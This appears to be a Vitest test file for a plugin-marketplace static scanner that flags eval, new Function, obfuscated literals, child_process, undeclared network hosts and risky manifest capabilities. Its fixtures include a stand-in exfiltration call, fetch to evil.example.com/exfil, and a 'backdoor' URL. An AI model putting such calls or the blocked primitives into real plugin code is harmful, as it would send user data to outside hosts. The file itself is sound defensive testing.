import { describe, it, expect } from "vitest";
import { runStaticScan } from "../../src/lib/audit/static-scanner";
import type { ValidatedManifest } from "../../src/lib/publishing/manifest-schema";

function makeManifest(
  overrides: Partial<ValidatedManifest> = {},
): ValidatedManifest {
  return {
    id: "test",
    version: "1.0.0",
    capabilities: [],
    allowedHosts: [],
    storage: {},
    hooks: [],
    routes: [],
    admin: {},
    ...overrides,
  } as ValidatedManifest;
}

describe("static-scanner", () => {
  it("returns no findings for clean code", () => {
    const files = new Map<string, string>([
      ["src/index.ts", "export default { activate() { return 'hi'; } };"],
    ]);
    const result = runStaticScan(files, makeManifest());
    expect(result.findings).toHaveLength(0);
    expect(result.dangerousPrimitiveCount).toBe(0);
    expect(result.undeclaredHosts).toHaveLength(0);
  });

  it("flags eval()", () => {
    const files = new Map<string, string>([
      ["src/index.ts", "export default { run(x) { return eval(x); } };"],
    ]);
    const result = runStaticScan(files, makeManifest());
    expect(result.dangerousPrimitiveCount).toBeGreaterThan(0);
    expect(result.findings.some((f) => f.title.includes("eval"))).toBe(true);
  });

  it("flags new Function()", () => {
    const files = new Map<string, string>([
      ["src/index.ts", "const fn = new Function('return 1');"],
    ]);
    const result = runStaticScan(files, makeManifest());
    expect(result.findings.some((f) => f.title.includes("Function"))).toBe(true);
  });

  it("flags long base64 literals", () => {
    const blob = "A".repeat(250);
    const files = new Map<string, string>([
      ["src/payload.ts", `const data = "${blob}";`],
    ]);
    const result = runStaticScan(files, makeManifest());
    expect(result.findings.some((f) => f.title.includes("base64"))).toBe(true);
  });

  it("flags hex-escaped string sequences", () => {
    const escapes = "\\x6a".repeat(40);
    const files = new Map<string, string>([
      ["src/payload.ts", `const data = "${escapes}";`],
    ]);
    const result = runStaticScan(files, makeManifest());
    expect(
      result.findings.some((f) => f.title.includes("Hex-escaped")),
    ).toBe(true);
  });

  it("flags hosts referenced in code but not declared in allowedHosts", () => {
    const files = new Map<string, string>([
      [
        "src/index.ts",
        `fetch("https://evil.example.com/exfil"); fetch("https://api.openai.com/v1/x");`,
      ],
    ]);
    const result = runStaticScan(files, makeManifest({ allowedHosts: [] }));
    expect(result.undeclaredHosts).toContain("evil.example.com");
    expect(result.undeclaredHosts).toContain("api.openai.com");
    expect(
      result.findings.some((f) => f.title.includes("not declared")),
    ).toBe(true);
  });

  it("matches hosts via subdomain", () => {
    const files = new Map<string, string>([
      [
        "src/index.ts",
        `fetch("https://oauth2.googleapis.com/token");`,
      ],
    ]);
    const result = runStaticScan(
      files,
      makeManifest({ allowedHosts: ["googleapis.com"] }),
    );
    expect(result.undeclaredHosts).toHaveLength(0);
  });

  it("matches wildcard manifest entries", () => {
    const files = new Map<string, string>([
      [
        "src/index.ts",
        `fetch("https://www.facebook.com/share");`,
      ],
    ]);
    const result = runStaticScan(
      files,
      makeManifest({ allowedHosts: ["*.facebook.com"] }),
    );
    expect(result.undeclaredHosts).toHaveLength(0);
  });

  it("warns when network:fetch:any is declared", () => {
    const files = new Map<string, string>();
    const result = runStaticScan(
      files,
      makeManifest({ capabilities: ["network:fetch:any"] }),
    );
    expect(
      result.findings.some((f) => f.title.includes("unrestricted network")),
    ).toBe(true);
  });

  it("warns when read:users is declared", () => {
    const files = new Map<string, string>();
    const result = runStaticScan(
      files,
      makeManifest({ capabilities: ["read:users"] }),
    );
    expect(result.findings.some((f) => f.title.includes("user data"))).toBe(true);
  });

  it("warns when email:intercept is declared", () => {
    const files = new Map<string, string>();
    const result = runStaticScan(
      files,
      makeManifest({ capabilities: ["email:intercept"] }),
    );
    expect(
      result.findings.some((f) => f.title.includes("intercepts outbound email")),
    ).toBe(true);
  });

  it("ignores manifest.json itself when scanning for primitives", () => {
    const files = new Map<string, string>([
      [
        "manifest.json",
        // Even though this contains the string "eval", it's the manifest
        '{"id":"x","version":"1.0.0","description":"this plugin does not eval()"}',
      ],
    ]);
    const result = runStaticScan(files, makeManifest());
    expect(result.dangerousPrimitiveCount).toBe(0);
  });

  // -------------------------------------------------------------------------
  // Blocking classification — the static-first pipeline uses these to decide
  // whether a version is hard-rejected or published with a caution tier.
  // -------------------------------------------------------------------------

  it("reports blockingCount of 0 for clean code", () => {
    const files = new Map<string, string>([
      ["src/index.ts", "export default { activate() { return 1; } };"],
    ]);
    const result = runStaticScan(files, makeManifest());
    expect(result.blockingCount).toBe(0);
  });

  it("marks eval() as blocking", () => {
    const files = new Map<string, string>([
      ["src/index.ts", "export default { run(x) { return eval(x); } };"],
    ]);
    const result = runStaticScan(files, makeManifest());
    expect(result.blockingCount).toBeGreaterThan(0);
    const evalFinding = result.findings.find((f) => f.title.includes("eval"));
    expect(evalFinding?.blocking).toBe(true);
  });

  it("marks new Function() as blocking", () => {
    const files = new Map<string, string>([
      ["src/index.ts", "const fn = new Function('return 1');"],
    ]);
    const result = runStaticScan(files, makeManifest());
    const fnFinding = result.findings.find((f) => f.title.includes("Function"));
    expect(fnFinding?.blocking).toBe(true);
  });

  it("blocks references to child_process", () => {
    const files = new Map<string, string>([
      ["src/bad.ts", "import { exec } from 'child_process';"],
    ]);
    const result = runStaticScan(files, makeManifest());
    const cp = result.findings.find((f) => f.title.includes("child_process"));
    expect(cp).toBeDefined();
    expect(cp?.blocking).toBe(true);
    expect(result.blockingCount).toBeGreaterThan(0);
  });

  it("blocks references to process.binding", () => {
    const files = new Map<string, string>([
      ["src/bad.ts", "const natives = process.binding('constants');"],
    ]);
    const result = runStaticScan(files, makeManifest());
    const pb = result.findings.find((f) =>
      f.title.includes("process.binding") || f.title.includes("native bindings"),
    );
    expect(pb).toBeDefined();
    expect(pb?.blocking).toBe(true);
  });

  // -------------------------------------------------------------------------
  // Flagging (non-blocking) patterns — published with Caution, not rejected.
  // -------------------------------------------------------------------------

  it("flags require() with a string literal as non-blocking", () => {
    const files = new Map<string, string>([
      ["dist/vendor.cjs", "var foo = require('lodash');"],
    ]);
    const result = runStaticScan(files, makeManifest());
    const req = result.findings.find((f) => f.title.includes("require"));
    expect(req).toBeDefined();
    expect(req?.blocking).toBe(false);
  });

  it("flags fs.readFile usage as non-blocking", () => {
    const files = new Map<string, string>([
      [
        "src/loader.ts",
        "import fs from 'fs'; const data = fs.readFile('./config.json');",
      ],
    ]);
    const result = runStaticScan(files, makeManifest());
    const fsFinding = result.findings.find((f) => f.title.includes("fs"));
    expect(fsFinding).toBeDefined();
    expect(fsFinding?.blocking).toBe(false);
  });

  it("does NOT false-positive on variables named refs or similar", () => {
    const files = new Map<string, string>([
      ["src/ui.ts", "const refs = items.map((x) => x.id); refs.forEach(log);"],
    ]);
    const result = runStaticScan(files, makeManifest());
    expect(result.findings.find((f) => f.title.includes("fs"))).toBeUndefined();
  });

  it("does NOT false-positive on RegExp.exec calls", () => {
    const files = new Map<string, string>([
      ["src/parse.ts", "const m = /(\\d+)/.exec(input);"],
    ]);
    const result = runStaticScan(files, makeManifest());
    expect(result.findings).toHaveLength(0);
    expect(result.blockingCount).toBe(0);
  });

  it("flags dynamic import() with computed specifier", () => {
    const files = new Map<string, string>([
      ["src/loader.ts", "const url = buildUrl(); const mod = await import(url);"],
    ]);
    const result = runStaticScan(files, makeManifest());
    const imp = result.findings.find((f) =>
      f.title.includes("Dynamic import"),
    );
    expect(imp).toBeDefined();
    expect(imp?.blocking).toBe(false);
  });

  it("does NOT flag dynamic import() with string literal", () => {
    const files = new Map<string, string>([
      ["src/loader.ts", "const mod = await import('./plugin-utils.js');"],
    ]);
    const result = runStaticScan(files, makeManifest());
    expect(
      result.findings.find((f) => f.title.includes("Dynamic import")),
    ).toBeUndefined();
  });

  it("flags IndexedDB references as non-blocking", () => {
    const files = new Map<string, string>([
      ["src/db.ts", "const req = indexedDB.open('mydb');"],
    ]);
    const result = runStaticScan(files, makeManifest());
    const idb = result.findings.find((f) => f.title.includes("IndexedDB"));
    // indexedDB is case-sensitive in our pattern, try the capitalised form
    const files2 = new Map<string, string>([
      ["src/db.ts", "const req = IndexedDB.open('mydb');"],
    ]);
    const result2 = runStaticScan(files2, makeManifest());
    const idb2 = result2.findings.find((f) => f.title.includes("IndexedDB"));
    expect(idb ?? idb2).toBeDefined();
    expect((idb ?? idb2)?.blocking).toBe(false);
  });

  it("flags localStorage references as non-blocking", () => {
    const files = new Map<string, string>([
      ["src/pref.ts", "localStorage.setItem('key', 'value');"],
    ]);
    const result = runStaticScan(files, makeManifest());
    const ls = result.findings.find((f) => f.title.includes("localStorage"));
    expect(ls).toBeDefined();
    expect(ls?.blocking).toBe(false);
  });

  // -------------------------------------------------------------------------
  // README exemption — markdown files should not trigger dangerous-pattern
  // scanning because they often contain code examples.
  // -------------------------------------------------------------------------

  it("does NOT flag eval() mentioned inside a .md file", () => {
    const files = new Map<string, string>([
      [
        "README.md",
        "# Plugin\nDoes not use `eval()` or `new Function()` internally.",
      ],
    ]);
    const result = runStaticScan(files, makeManifest());
    expect(result.findings.filter((f) => f.title.includes("eval"))).toHaveLength(
      0,
    );
    expect(result.blockingCount).toBe(0);
  });

  it("still scans .md files for host references", () => {
    const files = new Map<string, string>([
      ["README.md", "See https://evil.example.com/backdoor for details."],
    ]);
    const result = runStaticScan(files, makeManifest({ allowedHosts: [] }));
    expect(result.undeclaredHosts).toContain("evil.example.com");
  });

  // -------------------------------------------------------------------------
  // Capability + host findings are non-blocking
  // -------------------------------------------------------------------------

  it("marks undeclared-hosts finding as non-blocking", () => {
    const files = new Map<string, string>([
      ["src/fetch.ts", "fetch('https://api.openai.com/v1/chat');"],
    ]);
    const result = runStaticScan(files, makeManifest());
    const host = result.findings.find((f) => f.title.includes("not declared"));
    expect(host).toBeDefined();
    expect(host?.blocking).toBe(false);
  });

  it("marks capability warnings as non-blocking", () => {
    const result = runStaticScan(
      new Map(),
      makeManifest({ capabilities: ["network:fetch:any"] }),
    );
    const cap = result.findings.find((f) =>
      f.title.includes("unrestricted network"),
    );
    expect(cap?.blocking).toBe(false);
  });
});
